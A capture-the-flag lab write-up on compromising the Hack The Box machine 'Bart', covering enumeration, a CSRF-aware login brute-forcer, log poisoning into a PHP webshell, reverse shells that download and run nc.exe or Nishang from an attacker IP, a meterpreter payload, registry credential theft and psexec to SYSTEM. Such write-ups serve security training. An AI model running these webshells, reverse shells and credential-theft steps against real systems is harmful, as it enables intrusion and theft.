# HTB - Bart 10.10.10.81


Too long... gave up..


- Windows NT 10.0 Build 15063 i586
- IIS 10

- Brute force
- Find source in github
- Log poisoning
- Reverse php shell
- Get Credentials : reg query 
- Use Credentials : run as, net use, metasploit windows/gather/credentials/windows_autologin+use auxiliary/admin/smb/psexec_command


## Walkthrough
- https://dastinia.io/write-up/hackthebox/2018/07/14/hackthebox-bart/
- https://0xdf.gitlab.io/2018/07/15/htb-bart.html


Windows escalation, credentials
- http://www.fuzzysecurity.com/tutorials/16.html
- https://pentestlab.blog/2017/04/19/stored-credentials/
- https://daya.blog/2018/01/06/windows-privilege-escalation/


Read later : https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/



## Nmap

````
# nmap -sV -sC 10.10.10.81 -oA nmap/bart_initscan
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-11 21:17 EDT
Nmap scan report for 10.10.10.81
Host is up (0.18s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

````

## HTP redirect -> DNS

we are being redirected automatically to forum.bart.htb. 
Add entry in /etc/hosts entry

````
# echo "10.10.10.81 forum.bart.htb" >> /etc/hosts
# echo "10.10.10.81 bart.htb" >> /etc/hosts
````


## http://forum.bart.htb

### Wordpress


### Arvest site

````
# wget -r http://forum.bart.htb

# grep -RiP "bart" forum.bart.htb/

forum.bart.htb/index.html:<title>BART</title>
forum.bart.htb/index.html:<link rel='stylesheet' id='sydney-ie9-css'  href='http://forum.bart.htb/wp-content/themes/sydney/css/ie9.css?ver=4.8.2' type='text/css' media='all' />
forum.bart.htb/index.html: <h1 class="site-title"><a href="#" rel="home">BART</a></h1>
forum.bart.htb/index.html:  <div class="pos">CEO@BART</div>
forum.bart.htb/index.html:    <li><a class="mail" href="mailto:s.brown@bart.local" target="_blank"><i class="fa">M</i></a></li>
forum.bart.htb/index.html:  <div class="pos">CEO@BART</div>
forum.bart.htb/index.html:  <li><a class="mail" href="mailto:d.simmons@bart.htb" target="_blank"><i class="fa">M</i></a></li>
forum.bart.htb/index.html: <li><a class="mail" href="mailto:r.hilton@bart.htb" target="_blank"><i class="fa">M</i></a></li>
forum.bart.htb/index.html:  <div class="pos">Developer@BART</div>
forum.bart.htb/index.html:  <li><a class="mail" href="mailto:h.potter@bart.htb" target="_blank"><i class="fa">M</i></a></li>
forum.bart.htb/index.html:                                                                                                                                                    
...[snip]...
````

Extract email addresses
````
# grep -RiE -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b"
forum.bart.htb/index.html:s.brown@bart.local
forum.bart.htb/index.html:d.simmons@bart.htb
forum.bart.htb/index.html:r.hilton@bart.htb
forum.bart.htb/index.html:h.potter@bart.htb
forum.bart.htb/index.html:info@bart.htb
forum.bart.htb/index.html:info@bart.htb
````

Extract wordlists/dirbuster/directory-list-2
````
# cewl -w cewl-forum.txt -e -a http://forum.bart.htb
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
````



### Gobuster

````
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://bart.htb/ -x php,html -s 200,204,301,302,307,403 -t 100 | tee gobuster_bart

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bart.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 204,301,302,307,403,200
[+] Extensions   : .php,.html
=====================================================
/index (Status: 200)
/news (Status: 200)
/crack (Status: 200)
/08 (Status: 200)
/06 (Status: 200)
/2 (Status: 200)
/07 (Status: 200)
/articles (Status: 200)
/login (Status: 200)
/keygen (Status: 200)
/article (Status: 200)
...[snip]...
````
No 404, return 200 for all pages...

### Wfuzz

#### Identify error pages
````
# wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb/FUZZ/

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://bart.htb/FUZZ/
Total requests: 220560

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=302      0 L        0 W            0 Ch        "# directory-list-2.3-medium.txt"
000002:  C=302      0 L        0 W            0 Ch        "#"
000009:  C=302      0 L        0 W            0 Ch        "# Suite 300, San Francisco, California, 94105, USA."
000003:  C=302      0 L        0 W            0 Ch        "# Copyright 2007 James Fisher"
000004:  C=302      0 L        0 W            0 Ch        "#"
000005:  C=302      0 L        0 W            0 Ch        "# This work is licensed under the Creative Commons"
000016:  C=200    630 L     3775 W        158607 Ch       "images"
000018:  C=200    630 L     3775 W        158607 Ch       "2006"
000017:  C=200    630 L     3775 W        158607 Ch       "download"
000026:  C=200    630 L     3775 W        158607 Ch       "about"
000021:  C=200    630 L     3775 W        158607 Ch       "serial"
000025:  C=200    630 L     3775 W        158607 Ch       "contact"
000027:  C=200    630 L     3775 W        158607 Ch       "search"
000028:  C=200    630 L     3775 W        158607 Ch       "spacer"
000022:  C=200    630 L     3775 W        158607 Ch       "warez"
````
Error pages => 158607 Ch 

````
# wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bart.htb/FUZZ/ --hh 158607

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://bart.htb/FUZZ/
Total requests: 220560

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000014:  C=302      0 L        0 W            0 Ch        ""
000067:  C=200    548 L     2412 W        35529 Ch        "forum"
001614:  C=200     80 L      221 W         3423 Ch        "monitor"
002385:  C=200    548 L     2412 W        35529 Ch        "Forum"
019837:  C=200     80 L      221 W         3423 Ch        "Monitor"
````


## http://monitor.bart.htb

Visting monitor.bart.htb in our browser reveals the application “PHP Server Monitor v3.2.1”.


Add monitor.bart.htb to /etc/hosts 
````
# echo "10.10.10.81 monitor.bart.htb " >> /etc/hosts
````

Forfot password return an error on User doesn't exist...

potential usernames compiled from forum.bart.htb
````
# cat names.txt
s.brown@bart.local
d.simmons@bart.htb
r.hilton@bart.htb
h.potter@bart.htb
info@bart.htb
s.brown
d.simmons
r.hilton
h.potter
info
samantha
brown
daniel
simmons
robert
hilton
harvey
potter
````

we have two valid usernames harvey and daniel.
After some educated guessing : harvey:potter

Then I decided to write a brute forcer in python since I needed to get around csrf tokens (script included at end), and it found a password:
````
root@kali:~/hackthebox/bart-10.10.10.81# python3 brute_monitor_login.py cewl-forum.txt
|==>                            |               99/1028
[+] Found password: potter
````

````
brute forcer source

brute_monitor_login.py:

#!/usr/bin/env python3

import re
import requests
import sys
from multiprocessing import Pool


MAX_PROC = 50
url = "http://monitor.bart.htb/"
username = "harvey"

#<input type="hidden" name="csrf" value="aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57" />
csrf_pattern = re.compile('name="csrf" value="(\w+)" /')

def usage():
    print("{} [wordlist]".format(sys.argv[0]))
    print("  wordlist should be one word per line]")
    sys.exit(1)

def check_password(password):

    # get csrf token and PHPSESSID
    r = requests.get(url)
    csrf = re.search(csrf_pattern, r.text).group(1)
    PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]

    # try login:
    data = {"csrf": csrf,
            "user_name": username,
            "user_password": password,
            "action": "login"}
    proxies = {'http': 'http://127.0.0.1:8080'}
    headers = {'Cookie': "PHPSESSID={}".format(PHPSESSID)}
    r = requests.post(url, data=data, proxies=proxies, headers=headers)

    if '<p>The information is incorrect.</p>' in r.text:
        return password, False
    else:
        return password, True


def main(wordlist, nprocs=MAX_PROC):
    with open(wordlist, 'r', encoding='latin-1') as f:
       words = f.read().rstrip().replace('\r','').split('\n')

    words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]

    pool = Pool(processes=nprocs)

    i = 0
    print_status(0, len(words))
    for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
        if status:
            sys.stdout.write("\n[+] Found password: {} \n".format(password))
            pool.terminate()
            sys.exit(0)
        else:
            i += 1
            print_status(i, len(words))

    print("\n\nPassword not found\n")

def print_status(i, l, max=30):
    sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i*max)//l), " " * (max - ((i*max)//l)), i, l))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        usage()
    main(sys.argv[1])



````

Browsing around you see there is an entry for the “Internal Chat” service
Viewing the details of “Internal Chat” reveals that there is another application on a different domain “internal-01.bart.htb”


## http://internal-01.bart.htb


Visting internal-01.bart.htb in our browser reveals the login page of bart’s internal “dev chat”.
http://internal-01.bart.htb/simple_chat/login_form.php



### github
github repo https://github.com/magkopian/php-ajax-simple-chat. To validate that these two applications are the same, I inspected the css/chat_global.css 

The application removed the register_form.php page, and the link to it from the login_form.php page.

Still, register_form.php posts to register.php, which we saw in the gobuster results above.

We’ll use curl to create an account and get access to the site:

root@kali:~/hackthebox/bart-10.10.10.81# curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=0xdf&passwd=password 


### Log Poisoning


At the Rigth a [Log] button...
Looking at the source, there’s some added code compared to the github repo:
````
<div id="log_link">
  <script>
    function saveChat() {
      // create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done"
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            alert(xhr.responseText);
        }
    }
    xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
    xhr.send(null);
    alert("Done");
    }
  </script>
  <a href="#" onclick="saveChat()">Log</a>
</div>
````


the application will record the username & your user-agent in a log file as seen below.

````
# python3
Python 3.6.5rc1 (default, Mar 14 2018, 06:54:23)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> proxies={'http':'http://127.0.0.1:8080'}
>>> headers={'User-Agent':'0xdf: <?php phpinfo(); ?>'}
>>> r = requests.get('http://internal-01.bart.htb/log/log.php?filename=phpinfo.php&username=harvey', proxies=proxies, headers=headers)
````

Then visit http://internal-01.bart.htb/log/phpinfo.php: 


### PHP Webshell

So a webshell is possible:
````
>>> headers={'User-Agent':"0xdf: <?php system($_REQUEST['cmd']); ?>"}
>>> r = requests.get('http://internal-01.bart.htb/log/log.php?filename=0xdf.php&username=harvey', proxies=proxies, headers=headers)

root@kali:~/hackthebox/bart-10.10.10.81# curl http://internal-01.bart.htb/log/0xdf.php?cmd=whoami
[2018-04-28 22:55:12] - harvey - 0xdf: nt authority\iusr
````

### Meth 1 : Upload NC

We upload & execute a 64-bit netcat binary onto the machine (important for later) so we can get an interactive shell.

I injected the following code into the user agent field. Make sure you remember to escape the \.
````
<?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.171:7777/nc.exe','nc.exe')\""); ?>

<?php exec("nc.exe 10.10.15.171 6667 -e cmd.exe"); ?>
````


### Meth 2 : Nishang

Grab Invoke-PowerShellTcp.ps1 from Nishang, and add a line to the end:

````
# cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .
# tail -1 Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.48 -Port 4444
````

Give webshell powershell to get interactive shell and run it, and get shell:
````
>>> cmd = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')"
>>> r = requests.get('http://internal-01.bart.htb/log/0xdf.php?cmd={}'.format(cmd), proxies=proxies)
````
````
# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.81] 49673
Windows PowerShell running as user BART$ on BART
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\internal-01\log>whoami
nt authority\iusr
````


## Escalation-Guide/

### Metasploit

Generate reverse_tcp
````
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.171 LPORT=6969 -f exe > 6969.exe
````
Serve it with SMB
````
# impacket-smbserver kk kk
````
````
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 6969
LPORT => 6969
msf exploit(multi/handler) > set ExitonSession False
ExitonSession => false
msf exploit(multi/handler) > run -j
[*] Exploit running as background job 2.

[*] Started reverse TCP handler on 10.10.15.171:6969

executting our payload from smb share & getting shell

C:\inetpub\wwwroot\internal-01\log>\\10.10.15.171\kk\6969.exe

> use windows/gather/credentials/windows_autologin

msf post(windows/gather/credentials/windows_autologin) > set SESSION 7
SESSION => 7
msf post(windows/gather/credentials/windows_autologin) > run

[*] Running against BART on session 7
[+] AutoAdminLogon=1, DefaultDomain=DESKTOP-7I3S68E, DefaultUser=Administrator, DefaultPassword=3130438f31186fbaf962f407711faddb
[*] Post module execution completed
````


### Get credentials manually

I eventually found default credentials stored in the registry for autologon
Need `to be in 64 bit shell... => NC64 bits or upgrade 32bit shell to 64 shell
````
C:\inetpub\wwwroot\internal-01\log>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    DefaultDomainName    REG_SZ    DESKTOP-7I3S68E
    DefaultUserName    REG_SZ    Administrator
    DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb
````

?? Get-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" ??
There a several different ways to use these credentials to get access to administrator files (such as the flag). I’ll show two, run_as and net use:


### Credentials :  powershell “run as”

Use the password to create a credential that can be passed to Invoke-Command. In this case, shell.ps1 is another Invoke-PowerShellTcp.ps1 with the port changed to 5555:
````
PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"
PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"
PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost

root@kali:~/hackthebox/bart-10.10.10.81# nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.81] 50593
Windows PowerShell running as user Administrator on BART
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents>whoami
bart\administrator
````

### Credentials : net use

Just get’s access to the filesystem, but that’s all that is needed to get the flags:
````
PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
The command completed successfully.

PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> x:
PS X:\> cd users\administrator\desktop
PS X:\users\administrator\desktop> ls


    Directory: X:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/02/2018     12:51             32 root.txt
````

### Credentials : metasploit auxiliary/admin/smb/psexec_command

Now that we have the administrators credential getting system should be a snap.

We can perform a Pass the Hash Attack with metasploit’s various psexec modules. We need to add a route to the system so that the module can access the smb port 445 listening locally on the box. This can be achieved with metasploit’s route add command.

````
msf> use auxiliary/admin/smb/psexec_command
msf auxiliary(admin/smb/psexec_command) > set SMBUser Administrator
SMBUser => Administrator
msf auxiliary(admin/smb/psexec_command) > set SMBPass 3130438f31186fbaf962f407711faddb
SMBPass => 3130438f31186fbaf962f407711faddb
msf auxiliary(admin/smb/psexec_command) > set COMMAND \\\\10.10.15.171\\\kk\\\6969.exe
COMMAND => \\10.10.15.171\kk\6969.exe
msf auxiliary(admin/smb/psexec_command) > set RHOSTS 10.10.10.81
RHOSTS => 10.10.10.81
msf auxiliary(admin/smb/psexec_command) > options

Module options (auxiliary/admin/smb/psexec_command):

   Name                  Current Setting                   Required  Description
   ----                  ---------------                   --------  -----------
   COMMAND               \\10.10.15.171\kk\6969.exe        yes       The command you want to execute on the remote host
   RHOSTS                10.10.10.81                       yes       The target address range or CIDR identifier
   RPORT                 445                               yes       The Target port
   SERVICE_DESCRIPTION                                     no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                    no        The service display name
   SERVICE_NAME                                            no        The service name
   SMBDomain             .                                 no        The Windows domain to use for authentication
   SMBPass               3130438f31186fbaf962f407711faddb  no        The password for the specified username
   SMBSHARE              C$                                yes       The name of a writeable share on the server
   SMBUser               Administrator                     no        The username to authenticate as
   THREADS               1                                 yes       The number of concurrent threads
   WINPATH               WINDOWS                           yes       The name of the remote Windows directory
msf auxiliary(admin/smb/psexec_command) > route add 10.10.10.81/32 255.255.255.255 7
[*] Route added
msf auxiliary(admin/smb/psexec_command) > run

[+] 10.10.10.81:445       - Service start timed out, OK if running a command or non-service executable...
[*] 10.10.10.81:445       - checking if the file is unlocked
[*] 10.10.10.81:445       - Unable to get handle: The server responded with error: STATUS_SHARING_VIOLATION (Command=45 WordCount=0)
[-] 10.10.10.81:445       - Command seems to still be executing. Try increasing RETRY and DELAY
[*] 10.10.10.81:445       - Getting the command output...
[*] 10.10.10.81:445       - Command finished with no output
[*] 10.10.10.81:445       - Executing cleanup...
[+] 10.10.10.81:445       - Cleanup was successful
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/smb/psexec_command) >
[*] Sending stage (206403 bytes) to 10.10.10.81
[*] Meterpreter session 8 opened (10.10.15.171:6969 -> 10.10.10.81:49866) at 2018-07-14 01:15:57 -0400


msf auxiliary(admin/smb/psexec_command) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  7         meterpreter x64/windows  NT AUTHORITY\IUSR @ BART    10.10.15.171:6969 -> 10.10.10.81:49863 (10.10.10.81)
  8         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ BART  10.10.15.171:6969 -> 10.10.10.81:49866 (10.10.10.81)

msf auxiliary(admin/smb/psexec_command) > sessions -i 8
[*] Starting interaction with 8...
meterpreter > sysinfo
Computer        : BART
OS              : Windows 10 (Build 15063).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

````


